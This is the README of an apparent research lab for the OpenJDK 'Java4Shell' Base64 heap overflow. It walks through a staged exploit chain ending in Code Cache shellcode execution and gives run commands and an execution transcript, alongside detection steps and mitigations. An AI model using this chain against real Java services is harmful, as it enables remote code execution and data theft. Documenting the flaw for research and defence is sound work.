# Java4Shell — CVE-2026-114938

A complete, reproducible exploit lab for **CVE-2026-114938** ("Java4Shell" /
"Java2Shell"), the heap overflow in OpenJDK HotSpot's AVX-512 Base64 decoder.

The lab goes all the way from a malformed Base64 string to **arbitrary native
code execution**, using only the vulnerability itself — no `sun.misc.Unsafe`,
no JNI, no native library loading, and no second memory-safety bug.

```text
malformed Base64 tail  (64 * "A" + "=")
   |
   v  fixed 62-byte AVX-512 masked store
corrupted array length  ->  "writer"
   |
   +--> chosen-value linear write
   |       |
   |       +--> heap disclosure ("reader" / JavaBleed)
   |       |
   |       +--> corrupt a DirectByteBuffer.address
   |                |
   |                v  64-bit native read/write
   |            scan Code Cache for a JIT-compiled method
   |                |
   |                v  overwrite its code with shellcode
   |            J4S-RCE-PWN  (exit 42)
```

---

> ## ⚠️ Authorized testing only
>
> This repository contains working exploit code. It deliberately corrupts a JVM
> heap and executes shellcode. It is intended for **education, vulnerability
> research, and detection engineering** on systems you own.
>
> Run it only inside the disposable container this repo builds. Never point it
> at a system you do not own or have explicit written permission to test.
> Unauthorized use may violate computer-misuse laws.

---

## Contents

| | |
|---|---|
| **CVE** | CVE-2026-114938 |
| **Public names** | Java4Shell / Java2Shell |
| **Component** | OpenJDK HotSpot x86-64 AVX-512 VBMI Base64 intrinsic |
| **Root cause** | `BZHI` mask underflow → 64-byte store 62 bytes past the output buffer (CWE-122) |
| **Severity** | CVSS 3.1 **8.1** High (Oracle/NVD) · CVSS 4.0 **9.2** Critical (reporter) |
| **Hardware gate** | x86-64 with `avx512f avx512bw avx512vbmi bmi2` (Ice Lake+ / Zen 4+) |
| **Affected** | OpenJDK 17.0.6 – 17.0.21.0.3, 21.0.13.0.3, 25.0.5.0.3, 27.0.1.0.3 |
| **Fixed** | 17.0.21.1 · 21.0.13.1 · 25.0.5.1 · 27.0.1.1 |
| **Lab platform** | x86-64 Linux + Docker (uses Intel SDE when the host has no AVX-512) |

---

## What this lab demonstrates

Nine stages, each independently runnable, plus four negative controls:

| Stage | What it proves |
|---|---|
| `trigger` | The intrinsic really performs a 64-byte masked store; 62 bytes land past the decoded output. |
| `corrupt` | That store overwrites a neighbouring array's **length**, and Java's bounds checks then trust it. |
| `leak` | The corrupted length becomes a heap **disclosure** primitive ("JavaBleed"). |
| `write` | The corrupted length becomes a **chosen-value out-of-bounds write**. |
| `chain` | Full **writer → reader → forged array header → repair**, surviving three forced GCs. |
| `native` | Corrupting a `DirectByteBuffer.address` yields **64-bit native read/write**. |
| `codecache` | Scanning and overwriting JIT-compiled code yields **shellcode execution**. |
| `rce` | A separate, application-specific path: attacker bytes reach an app sink and execute. |
| `control` ×4 | Every stage above has a `-XX:-UseBASE64Intrinsics` twin that must **not** reproduce. |

### The primitives, in order

1. **Fixed write.** A malformed Base64 tail makes `output_len` go negative. `BZHI`
   reads only the low 8 bits, so the mask becomes all-ones and a 64-byte store
   runs past the output array. Java throws `IllegalArgumentException` — after the
   write has already happened.
2. **Writer.** The spill lands on a neighbouring array's 4-byte length field,
   turning it into `0x699AA669` (1,771,742,825). Ordinary Java stores now write
   attacker-chosen bytes far past that array.
3. **Reader.** The writer installs a chosen length into a second array, giving
   out-of-bounds reads through plain Java indexing.
4. **Forge.** A fake array header plus a forged compressed oop gives an aliased
   view with read/write over other heap objects.
5. **Repair.** Lengths and oops are restored, the corrupted writer is dropped,
   and three forced GCs confirm the heap is consistent — the step the
   researchers describe as needed "to keep the JVM running".
6. **Native.** A corrupted `java.nio.DirectByteBuffer.address` turns the buffer's
   own public API into a 64-bit native read/write, escaping the Java heap.
7. **Code execution.** A JIT-compiled method is located in the Code Cache by its
   unique instruction bytes, overwritten with shellcode, and invoked.

---

## Quick start

Requirements: x86-64 Linux, Docker, ~1.5 GB disk, and network access **at build
time** (runtime is fully offline).

```bash
git clone https://github.com/akshutgoyal/Java4Shell.git
cd Java4Shell
chmod +x run.sh

./run.sh --build codecache     # full chain -> shellcode execution
```

Expected tail of the output:

```text
[2] NATIVE READ/WRITE READY
[3] 2 signature site(s): 0x7f5fb4b3d59a, 0x7f5fd4089959
[4] shellcode installed at 2 site(s)
[5] invoking victimMethod() ...
[5] expect marker below and exit status 42
J4S-RCE-PWN
[codecache] OK: shellcode executed (exit 42)
```

Success means the shellcode **we wrote** printed `J4S-RCE-PWN` and then called
`exit_group(42)`. A crash would not produce either.

### Run every stage

```bash
./run.sh all          # ~14 minutes under SDE
```

### Run one stage

```bash
./run.sh trigger    ./run.sh corrupt    ./run.sh leak      ./run.sh write
./run.sh chain      ./run.sh native     ./run.sh codecache ./run.sh rce
```

### Negative controls

Each must fail to reproduce. Controls exit 0 when they correctly do nothing.

```bash
./run.sh control           # trigger with -XX:-UseBASE64Intrinsics
./run.sh chain-control     # heap chain, intrinsic disabled
./run.sh codecache-control # RCE chain, intrinsic disabled
./run.sh rce-control       # app-sink path, intrinsic disabled
```

### On real AVX-512 hardware

The lab uses Intel SDE to emulate AVX-512 on hosts that lack it. If your CPU has
all four flags, skip emulation entirely (much faster):

```bash
LAB_MODE=native ./run.sh codecache
```

> `LAB_MODE=native` (no emulator) is unrelated to the `native` **stage**
> (`./run.sh native`, the DirectByteBuffer primitive).

---

## How it works without AVX-512 hardware

The vulnerable code is real AVX-512 VBMI machine code, generated by HotSpot only
when the CPU reports `avx512vbmi`. QEMU's TCG cannot emulate AVX-512, so this lab
uses **Intel SDE 10.13.1**:

```text
sde64 -chip_check_disable -icx -- java ...
```

`-icx` spoofs an Ice Lake CPUID and `-chip_check_disable` permits that on any
host. HotSpot then reports `UseAVX=3` / `UseBASE64Intrinsics=true` and generates
the genuine vulnerable stub. SDE executes the **actual JVM machine code** — this
is CPU emulation, not a reimplementation of the bug.

The JVM is **Temurin 21.0.13+9**, a pre-fix build, pinned by image digest so the
tag cannot silently change. SDE is downloaded from Intel's official mirror and
verified against Intel's published SHA-256 at build time.

Because emulation is slow, the runner uses `-Xcomp -XX:-TieredCompilation` and a
short warm-up so C2 compiles the decode path quickly.

---

## Verified results

Recorded on Temurin 21.0.13+9 under Intel SDE, 2026-11-24:

| Stage | Key output | Exit |
|---|---|---|
| `trigger` | `changed=62 first=50 last=111` → `REPRODUCED` | 0 |
| `control` | `changed=0` → `NOT REPRODUCED` | 1 (by design) |
| `corrupt` | length `64 → 1771742825`, `OOB READ REPRODUCED` | 0 |
| `leak` | marker at `victim[80]` → `JAVA BLEED REPRODUCED` | 0 |
| `write` | target bytes `42 43 44 …` → `OOB WRITE REPRODUCED` | 0 |
| `chain` | writer/reader/forge → `REPAIR OK` after 3 GCs | 0 |
| `native` | `native read ok` + `native write ok` → `NATIVE PRIMITIVE REACHED` | 0 |
| `codecache` | `J4S-RCE-PWN` → `shellcode executed (exit 42)` | 0 (42 inside) |
| `rce` | `RCE CONFIRMED`, command output returned | 0 |
| all controls | no corruption, no marker | 0 |

<details>
<summary><b>Full <code>codecache</code> transcript</b></summary>

```text
runtime = 21.0.13+9-LTS
[warm] decoder compiled
[warm] victimMethod() = 0x4a34535243454f31 (compiled)
[1] writer.length = 1771742825 (0x699aa669)
[2] victim data = 0x7172243b0 at writer[832], writer data = 0x717224070
    probing buffer obj=0x717224198 -> writer[296]
    +16  writer[ 312] 0x00007f5fc0187260 <== address field
    probing buffer obj=0x717224318 -> writer[680]
    +16  writer[ 696] 0x00007f5fc018db20 <== address field
[2] direct.address @ writer[312], scan.address @ writer[696]
[2] NATIVE READ/WRITE READY
[3] scanning 44 readable executable mappings
[3] scanned 1093748 KiB, 0 unreadable chunk(s)
[3] 2 signature site(s): 0x7f5fb4b3d59a, 0x7f5fd4089959
[3] shellcode 48 bytes: b8 01 00 00 00 bf 01 00 00 00 48 8d 35 13 ...
[4] shellcode installed at 2 site(s)
[5] invoking victimMethod() ...
J4S-RCE-PWN
[codecache] OK: shellcode executed (exit 42)
```

</details>

---

## Repository layout

```text
Dockerfile              pinned vulnerable Temurin + SHA-256-verified Intel SDE
run.sh                  plain-Docker launcher (no Compose required)
compose.yaml            optional Compose configuration
scripts/run-lab.sh      stage runner: trigger|control|...|codecache|all

poc/Base64Trigger.java  bounded trigger: measures the 62-byte overflow
poc/HeapCorruption.java neighbour length corruption + OOB read
poc/HeapLeak.java       JavaBleed-style heap disclosure
poc/HeapWrite.java      chosen-value OOB write
poc/Chain.java          writer -> reader -> forged header -> repair + GC
poc/NativeProbe.java    corrupted DirectByteBuffer.address -> native R/W
poc/CodeCacheRce.java   Code Cache overwrite -> shellcode execution
poc/RceLab.java         vulnerable HTTP service (application-sink path)
poc/RceClient.java      attacker client for the HTTP path
```

---

## Scope and honesty

What this lab **does** prove:

- The bug is a real, silent, out-of-bounds write that survives the
  `IllegalArgumentException`.
- That write alone escalates to heap read/write, native memory access, and
  control-flow hijack — with no second vulnerability.
- Every step has a negative control that fails to reproduce when the intrinsic
  is disabled.

What it **does not** provide:

- **Remote exploitation.** There is no network transport, G1 heap grooming,
  region spraying, TLB/request parking, or retry logic. The lab uses
  deterministic TLAB adjacency from a pinned image. Real targets need the
  application-specific grooming Calif describes.
- **A universal payload.** The Code Cache search relies on x86-64 encoding and a
  unique `movabs` constant. Another JVM build, GC, or inlining decision may need
  a different signature. That is an engineering difference, not a missing
  primitive.
- **A product exploit.** The `rce` stage executes commands only because
  `RceLab` contains a maintenance sink that runs a config string. It
  demonstrates the *last mile* shape of a real chain, not a gadget for a
  specific product.
- **Writable Code Cache everywhere.** The `codecache` stage relies on the JVM
  having writable+executable code pages (20 of 45 executable mappings here). A
  hardened runtime without RWX pages needs a different target.

---

## Affected versions and hardware

| Branch | Affected | Fixed |
|---|---|---|
| 17 | 17.0.6 – 17.0.21.0.3 | **17.0.21.1** |
| 21 | up to 21.0.13.0.3 | **21.0.13.1** |
| 25 | up to 25.0.5.0.3 | **25.0.5.1** |
| 27 | up to 27.0.1.0.3 | **27.0.1.1** |
| 8 (Oracle Enterprise Performance Pack) | 8u511b33-perf | **8u513-perf** |

Standard Java 8/11 builds and OpenJ9 are not affected. The bug was introduced in
OpenJDK 17.0.6. The intrinsic only runs when **all four** flags are present:

```text
avx512f  avx512bw  avx512vbmi  bmi2
```

i.e. Intel Ice Lake / Sapphire Rapids / Emerald Rapids / Granite Rapids, or AMD
Zen 4+. ARM64, older x86-64, and any JVM started with `-XX:UseAVX=2` never take
the vulnerable path. The intrinsic also requires the decode path to be
JIT-compiled by C2 first.

---

## Detecting affected hosts

```bash
uname -m
grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' \
  | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'
java -version
jcmd <pid> VM.version          # exact build of a running JVM
```

Also look for `hs_err_pid*` files and JVM exits 134/139. Two cautions:

- Inside containers, `/proc/cpuinfo` reflects the **host** CPU. A node that is
  safe today can be rescheduled onto a vulnerable one.
- Patching the host package does not update a JDK **bundled** inside a product or
  image. Audit each runtime separately.

## Mitigation

1. **Patch and restart.** Upgrade to 17.0.21.1 / 21.0.13.1 / 25.0.5.1 /
   27.0.1.1 (or the distributor's equivalent), then restart every JVM and rebuild
   every image.
2. **Temporary JVM flags** (either disables the vulnerable path):
   ```bash
   -XX:-UseBASE64Intrinsics
   -XX:UseAVX=2          # x86-64 only; ARM JVMs reject this flag
   ```
3. **Reject malformed Base64** whose length (after stripping whitespace) is not a
   multiple of 4, before calling `decode`. This blocks the known trigger but is
   not a general fix for every decoder route.
4. **WAF rules** are supplementary; they do not repair the runtime.
5. **Assume compromise if exposed.** Patching does not undo a successful heap
   disclosure or code execution. Rotate secrets that may have been in the heap.

## Cleanup

```bash
docker image rm java4shell-lab:local
# if you used Compose:
docker compose down --rmi local --volumes
```

SDE is Intel software under the Intel Simplified Software License. It is
downloaded at build time and is not redistributed here.

---

## References

- Calif technical write-up and original PoC — <https://calif.io/java4shell/>
- JFrog research summary — <https://research.jfrog.com/post/java4shell-vulnerability/>
- Tenable FAQ — <https://www.tenable.com/blog/java4shell-cve-2026-114938-frequently-asked-questions-about-openjdk-rce-vulnerability>
- OpenJDK advisory 2026-11-17 — <https://openjdk.org/groups/vulnerability/advisories/2026-11-17>
- Oracle CSPU November 2026 — <https://www.oracle.com/security-alerts/cspunov2026.html>
- NVD — <https://nvd.nist.gov/vuln/detail/CVE-2026-114938>
- CVE record — <https://www.cve.org/CVERecord?id=CVE-2026-114938>
- Upstream fix — <https://github.com/openjdk/jdk/commit/5177a70b385c16f26ede191fdac7aaba0bed0f8b>

## Credits and licensing

- Vulnerability research, write-up and the original bounded trigger:
  **Quang Luong / Calif**.
- Independent rediscovery and G1 grooming analysis: **Chainguard**.
- Lab containerisation, heap-exploitation chain, native primitive and Code Cache
  stage: **Akshut Goyal**.

Licensed under the **MIT License** — see [LICENSE](LICENSE). The licence covers
this repository's original code. The bounded trigger follows Calif's published
PoC; credit for that work belongs to Calif. Intel SDE is not redistributed and
remains under Intel's own licence.
